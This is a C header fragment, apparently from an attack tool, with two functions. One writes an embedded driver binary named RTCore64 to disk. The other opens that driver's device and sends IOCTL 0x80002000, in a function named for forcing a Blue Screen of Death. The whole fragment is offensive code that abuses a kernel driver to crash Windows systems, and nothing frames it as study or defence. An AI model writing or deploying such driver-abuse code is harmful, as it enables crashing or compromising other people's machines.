#pragma once

void RTCore64DrvCreation( const char* RTCore64_path )
{
	FILE* file_write_binary = fopen( RTCore64_path, "wb" );

	size_t dataSize = sizeof( RTCore64Data ) / sizeof( RTCore64Data[ 0 ] );
	size_t Written = fwrite( RTCore64Data, 1, dataSize, file_write_binary );

	fclose( file_write_binary );
}

void IOCTL_Blue_Screen_of_Death( void )
{
	HANDLE hDevice = CreateFileA( "\\\\.\\RTCore64", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL );
	if ( hDevice == INVALID_HANDLE_VALUE || hDevice == NULL )
		exit( 0 );

	DWORD bytes = 0;
	if ( !DeviceIoControl( hDevice, 0x80002000, NULL, 0, NULL, 0, &bytes, NULL ) )
	{
		CloseHandle( hDevice );
		exit( 0 );
	}

	CloseHandle( hDevice );
}